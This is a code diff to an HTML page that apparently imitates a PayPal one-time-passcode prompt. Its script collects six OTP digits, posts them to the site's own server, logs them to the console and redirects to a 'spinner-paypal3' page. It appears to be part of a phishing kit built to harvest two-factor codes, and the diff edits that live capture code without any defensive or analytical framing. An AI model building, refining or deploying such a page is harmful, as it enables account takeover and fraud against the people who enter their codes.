@@ -208,44 +208,34 @@ ul.priorityCountries li:first-child a:hover {
         <input type="text" name="otp6" id="otp6" maxlength="1" required pattern="\d*">
     </div>
     <div class="errorMessage" id="otpErrorMessage"></div>
-    <div class="actions">
-        <button class="button actionContinue" type="submit" id="submitOtpBtn">Submit</button>
-    </div>
+    <button class="button actionContinue" type="submit">Submit</button>
 </form>
 
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('paypotpform');
-    const otpInputs = form.querySelectorAll('input[type="text"]');
-    
-    otpInputs.forEach((input, index) => {
-        input.addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '');
-            if (index < otpInputs.length - 1 && this.value.length === 1) {
-                otpInputs[index + 1].focus();
-            }
-        });
-    });
 
     form.addEventListener('submit', function(event) {
-        event.preventDefault();
-        
+        event.preventDefault(); // Prevent the default form behavior
         const formData = new FormData(this);
         let data = new URLSearchParams();
+
         for (const pair of formData) {
             data.append(pair[0], pair[1]);
         }
 
+        // Debugging: Log the data to be sent
+        console.log("Form data to be sent:", data.toString());
+
         fetch('/', {
             method: 'POST',
-            headers: { 
-                'Content-Type': 'application/x-www-form-urlencoded' 
-            },
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: data
         })
         .then(response => {
+            console.log("Form submission response:", response);
             if (response.ok) {
-                window.location.href = '/spinner-paypal3.html';
+                window.location.href = '/spinner-paypal3.html'; // Redirect on success
             } else {
                 document.getElementById('otpErrorMessage').textContent = 'Submission failed. Please try again.';
             }
